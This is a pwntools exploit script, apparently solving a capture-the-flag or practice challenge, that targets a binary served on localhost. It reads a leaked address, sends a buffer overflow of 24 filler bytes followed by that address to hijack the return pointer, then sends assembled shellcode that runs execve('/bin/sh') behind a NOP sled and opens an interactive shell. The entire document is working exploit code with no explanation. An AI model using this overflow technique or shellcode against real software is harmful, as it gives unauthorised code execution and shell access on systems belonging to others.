from pwn import *
context.arch="amd64"
context.terminal = ["alacritty","-e"]
# p = gdb.debug("./main")
# p = process("./main")
p = remote("localhost",6666)

p.recvuntil(b"Chorba: ")
chorba_addr = p.recvline()
log.info(f"{chorba_addr=}")
chorba_addr = int(chorba_addr,16)

# rbp = chorba_addr-16
# payload += p64(rbp)
payload =  b"A"*24
payload += p64(chorba_addr)
log.info(len(payload))
p.send(payload)
p.send(asm("""
mov rax,59
mov rdi,0x0068732f6e69622f
push rdi
mov rdi,rsp
mov rsi,0
mov rdx,0
syscall

mov rax,60
mov rdi,69
syscall
""").ljust(256,b"\x90"))
p.interactive()
